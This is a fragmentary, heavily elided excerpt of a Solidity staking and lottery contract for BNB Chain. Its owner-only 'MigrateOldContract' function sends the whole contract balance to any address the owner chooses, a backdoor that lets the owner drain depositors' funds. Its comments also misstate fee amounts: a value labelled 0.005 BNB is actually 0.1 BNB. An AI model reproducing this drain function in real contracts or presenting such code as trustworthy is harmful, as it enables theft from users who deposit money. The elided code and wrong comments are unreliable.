...
// SPDX-License-Identifier: MIT
    ...
    */
    ...
    contract BSC_DefiStaked_v2 is ReentrancyGuard {
        ...
        uint256 public LOTTERY_TICKET_PRICE = 100 * 1e15; /** 0.005 BNB **/
        ...
        uint256 public MIN_INVEST = 100 * 1e15; /** 0.100 BNB  **/
        uint256 public WITHDRAW_COOLDOWN = 12 * 60 * 60; /** 12 hours  **/
        uint256 public WITHDRAW_LIMIT = 2000 * 1e15; /** 2.000 BNB  **/
        ...
        *************************************************************/
        ...
        function getUserInfoPlus(address _adr) public view returns(uint256 _migrate, address _walletUser) {
            User_plus storage user_plus = users_plus[_adr];
            return (user_plus.migrate,
                    user_plus.wallet_user);
        }
        ...
        **/
        ...
        function SET_LOTTERY_TICKET_OPTION(uint256 _ticketPrice, uint256 _maxTicket) external onlyOwner{
            require(_maxTicket <= 100 && _maxTicket > 0);
            
            if(_ticketPrice > 0){
                LOTTERY_TICKET_PRICE = _ticketPrice;
            }

            MAX_LOTTERY_TICKET = _maxTicket;
        }
        ...
        function MigrateOldContract(address payable _oldContractData) external onlyOwner{
            sendValue(_oldContractData, getBalance()); 
        }
        ...
        return LOTTERY_START_TIME + LOTTERY_STEP;
        }
    ...
    /** will auto execute, when condition is met. buy, hatch and sell, can be triggered manually by admin if theres no user action. **/
        ...
        *************************************************************/
        ...
        function Migrate_Wallet(address _walletUserInterface) external nonReentrant{
            require(!isContract(msg.sender));
            User storage userContractNew = users[_walletUserInterface];
            User_plus storage usersPlus = users_plus[_walletUserInterface];

            if(usersPlus.migrate == 0 && userContractNew.initialDeposit == 0){
                // PART-1
                ...
                if(!iswhitelist(_walletUserInterface)){
                                                        // 110%
                    if( userContractNew.userDeposit + (userContractNew.userDeposit*10/100) < userContractNew.totalWithdrawn){
                        userContractNew.miners = 0;
                    }
                } 
                
                userContractNew.lastHatch = block.timestamp;
                usersPlus.migrate = 1;
            }
        }

        function _part1(address _walletUserInterface) internal view returns(uint256 _initialDepositosit,uint256 _userDeposit,uint256 _miners,uint256 _userTotalLotteryBonus){
            (_initialDepositosit, 
            _userDeposit, 
            _miners, 
            /*uint256 claimedEgg*/, 
        ...
        function _part2(address _walletUserInterface) internal view returns(address _referrer,uint256 _referralsCount,uint256 _totalWithdrawn,uint256 _referralEggRewards,uint256 _dailyCompoundBonus){
            ( , , , , , , 
            _referrer, 
            _referralsCount, 
            _totalWithdrawn, 
        ...
        function GetSetSiteInfoOfOldContract(bool _transfer) internal{
            if(_transfer == true){
        ...
        *************************************************************/
        ...
        function sendLiquidity() external payable returns(bool){
            return true;
        }
